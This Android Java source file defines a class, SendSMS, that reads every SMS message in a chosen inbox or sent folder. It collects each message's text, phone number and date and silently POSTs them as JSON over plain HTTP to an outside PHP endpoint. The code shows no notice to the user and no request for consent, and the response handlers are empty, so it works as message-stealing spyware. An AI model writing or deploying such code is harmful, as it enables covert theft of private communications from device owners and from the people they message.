package com.mujahidrasool.broadcastreceiver;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class SendSMS {

    String url_string = "http://mujahidrasool.com/m/ins.php";
    int i = 0;
    Context context;
    String type;


    ArrayList<JSONObject> jsonObjects = new ArrayList<>();
    JSONArray jsonArray = new JSONArray();

    public SendSMS(Context con, String tp) {
        this.context = con;
        this.type = tp;

        Cursor cursor = context.getContentResolver().query(Uri.parse(type), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
//

            do {
                try {
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body")).toString();
                    String number = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
                    String date = cursor.getString(cursor.getColumnIndexOrThrow("date")).toString();
                    String typ = "0";

                    if (type.contains("sent")) {


                        typ = "1";
                    } else {
                        typ = "0";

                    }

                    JSONObject jsonObject = new JSONObject();
                    try {
                        jsonObject.put("body", body);
                        jsonObject.put("number", number);
                        jsonObject.put("date", date);
                        jsonObject.put("type", typ);

                    } catch (Exception e) {
                        e.printStackTrace();
                    }


                    jsonObjects.add(jsonObject);


                } catch (Exception e) {
                    e.printStackTrace();
                }
            } while (cursor.moveToNext());
//While

            for (int j = 0; j < jsonObjects.size(); j++) {
                jsonArray.put(jsonObjects.get(j));

            }


            // Posting data in php file
            StringRequest stringRequest = new StringRequest(Request.Method.POST, url_string, new Response.Listener<String>() {

                @Override
                public void onResponse(String response) {


                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {


                }
            }) {


                @Override
                protected Map<String, String> getParams() throws AuthFailureError {

//Sending data to php file
                    Map<String, String> params = new HashMap<>();

//                            }

                    params.put("js", jsonArray.toString());
                    return params;


                }
            };

            // Network calling
            stringRequest.setRetryPolicy(new DefaultRetryPolicy(
                    900000,
                    DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
            RequestQueue requestQueue = Volley.newRequestQueue(context.getApplicationContext());
            requestQueue.add(stringRequest);


        }

    }
}
